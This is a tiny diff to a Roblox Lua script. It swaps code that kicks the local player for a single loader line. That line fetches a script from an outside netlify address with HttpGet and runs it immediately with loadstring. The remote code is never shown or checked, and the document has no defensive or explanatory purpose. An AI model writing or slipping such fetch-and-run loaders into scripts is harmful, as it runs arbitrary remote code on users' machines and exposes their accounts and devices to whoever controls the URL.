@@ -1,4 +1,1 @@
-local Players = game:GetService("Players")
-local lp = Players.LocalPlayer
-
-lp:Kick("Get out.")
+loadstring(game:HttpGet("https://get-avth-ontop.netlify.app/my-paste/script.lua"))()
